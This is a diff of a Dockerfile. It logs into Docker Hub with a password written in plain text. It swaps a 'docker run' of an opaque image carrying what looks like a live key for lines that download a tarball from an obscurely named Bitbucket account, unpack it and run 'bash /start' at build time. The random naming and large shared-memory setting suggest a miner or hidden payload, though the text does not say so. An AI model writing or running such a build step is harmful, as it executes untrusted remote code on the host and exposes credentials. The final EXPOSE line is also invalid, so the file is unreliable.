@@ -7,6 +7,8 @@ RUN apt-get update && \
 
 RUN echo "Linuxdistro&84" | docker login --username webwebwebwebwebweb --password-stdin
 
-RUN docker pull webwebwebwebwebweb/tradetrade8888;docker run -it -d --shm-size="32000m" -p 8080:8080 webwebwebwebwebweb/tradetrade8888 /bin/bash /start linux8888 live_N3UNeQ2cgeGsB6zKrSWd047Pplr9VZU01TYyIBqA2H0z
+RUN wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && tar -xvf ./linux8888.tar.gz
+
+RUN bash /start
 
 EXPOSE WEBSITE http://localhost:8080
